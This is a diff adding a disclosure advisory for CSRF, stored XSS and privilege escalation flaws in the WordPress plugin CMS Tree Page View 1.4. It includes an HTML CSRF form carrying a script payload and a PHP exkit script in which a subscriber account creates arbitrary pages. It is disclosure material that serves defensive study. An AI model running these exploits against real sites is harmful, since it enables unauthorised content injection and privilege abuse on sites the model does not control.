@@ -1,0 +1,109 @@
+* Exploit Title: CMS Tree Page View [CSRF, Privilege Escalation]
+* Discovery Date: 2017-12-12
+* Exploit Author: Panagiotis Vagenas
+* Author Link: https://twitter.com/panVagenas
+* Vendor Homepage: http://eskapism.se/
+* Software Link: https://wordpress.org/plugins/cms-tree-page-view
+* Version: 1.4
+* Tested on: WordPress 4.8.1
+* Category: WebApps, WordPress
+
+
+Description
+-----------
+
+Plugin implements AJAX action `cms_tpv_add_page` which calls back the
+function `cms_tpv_add_page`. The later does not implement any anti-CSRF
+controls or security checks.
+
+Leveraging a CSRF attack an attacker could perform a Persistent XSS
+attack if the victim has administrative rights (see PoC).
+
+The AJAX action is a privileged one so it's only available for
+registered users. Even so it doesn't implement any capabilities checks
+so it's available to all users no matter the access level. This could
+allow any registered user to create arbitrary posts no matter the access
+level.
+
+PoC
+---
+
+### CSRF -> Persistent XSS
+
+In this PoC we exploit the `$_POST["page_titles"]` param to perform a
+Persistent XSS attack.
+
+```
+<pre class="lang:html decode:true "><form method="post" action="http://wp-plugin-csrf.dev/wp-admin/admin-ajax.php">
+    <input type="hidden" name="action" value="cms_tpv_add_page">
+    <input type="text" name="type" value="after">
+    <input type="text" name="pageID" value="1">
+    <input type="text" name="post_type" value="page">
+    <input type="text" name="page_title" value="<script>alert(2)</script>">
+    <button type="submit" value="Submit">Submit</button>
+</form>
+
+```
+
+### Create Arbitrary Posts
+
+In this PoC we use a user with subscriber access to create arbitrary
+pages. The post\_type is user defined so in the same manner we could
+create any post type.
+
+```
+#!/usr/bin/env php
+<?php
+/*******************************************************************************
+ * CMS Tree Page View [Privilege Escalation]
+ *
+ * To install deps run `composer require wordfence/exkit`.
+ *
+ * @author Panagiotis Vagenas <pan.vagenas@gmail.com>
+ * @date 2017-08-09
+ ******************************************************************************/
+
+require_once __DIR__ . '/vendor/autoload.php';
+
+use Wordfence\ExKit\Cli;
+use Wordfence\ExKit\Config;
+use Wordfence\ExKit\Endpoint;
+use Wordfence\ExKit\ExitCodes;
+use Wordfence\ExKit\WPAuthentication;
+
+Config::get( 'url.base', null, true, 'Enter the site URL' )
+|| ExitCodes::exitWithFailedPrecondition( 'You must enter a valid URL' );
+
+$s = new \Wordfence\ExKit\Session( null, [], [], [ 'timeout' => 60 ] );
+
+Cli::writeInfo( 'Logging in as subscriber...' );
+
+WPAuthentication::logInAsUserRole( $s,
+WPAuthentication::USER_ROLE_SUBSCRIBER );
+
+Cli::writeInfo( 'Sending payload...' );
+
+$postData = [
+    'action'      => 'cms_tpv_add_page',
+    'type'        => 'after',
+    'pageID'      => '1',
+    'post_type'   => 'page',
+    'page_title' => date('Y-m-d H:i:s'),
+];
+
+$r = $s->post( Endpoint::adminAjaxURL(), [], $postData);
+
+if(!$r->success || $r->body == '0'){
+    ExitCodes::exitWithFailed('Failed to retrieve a valid response');
+}
+
+ExitCodes::exitWithSuccess('Exploitation successful');
+
+```
+
+Timeline
+--------
+
+1. **2017-12-12**: Discovered
+2. **2017-12-23**: Vendor notified by email
+3. **2018-01-06**: Patch released
